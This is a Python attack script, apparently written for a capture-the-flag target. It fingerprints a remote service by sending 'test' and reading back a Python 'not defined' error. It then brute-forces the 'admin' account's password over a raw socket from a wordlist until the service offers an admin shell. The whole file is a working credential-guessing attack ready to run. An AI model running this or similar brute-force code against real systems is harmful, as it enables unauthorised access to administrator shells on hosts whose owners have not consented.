#!/usr/bin/python3 

import socket
import sys
import time
import os



def main():
	if len(sys.argv) != 4:
		print('Usage: [X] <exploit.py> <target> <port> <pathToWordlist>')
		sys.exit(0)

main()
target = sys.argv[1]
port = sys.argv[2]
port = int(port)
	

def brute():
	try:
		timer = 0
		s = socket.socket()
		s.connect((target, port))
		s.send(b'admin')
		wordlist = open(sys.argv[3], 'r')
		for word in wordlist:
			timer = timer + 1
			word = word.strip()
			time.sleep(0.050)
			print('Trying: {} on line {}'.format(word,timer))
			s.send(word.encode())
			if 'Welcome Admin!!! Type "shell" to begin' in s.recv(1024).decode():
				print('Potential password found! Try password on line {}'.format(timer - 1))
				break
			elif (timer % 3 == 0):
				s.send(b'admin')

	except socket.error as error:
		print(error)



try:
	s = socket.socket()
	s.connect((target, port))
	s.send(b'test')
	if "'test' is not defined" in s.recv(1024).decode():
		for w in 'Connection Successful. Attempt exploit? Y/n\n\r':
			time.sleep(0.015)
			sys.stdout.write('{}'.format(w))
			sys.stdout.flush()
		dec = input().lower()
		if dec == 'y':
			s.close()
			brute()
		else:
			sys.exit(0)

	else:
		for w in 'Connection Failed':
			time.sleep(0.015)
			sys.stdout.write('{}'.format(w))
			sys.stdout.flush()
		print('\n')
except socket.error as error:
	print(error)


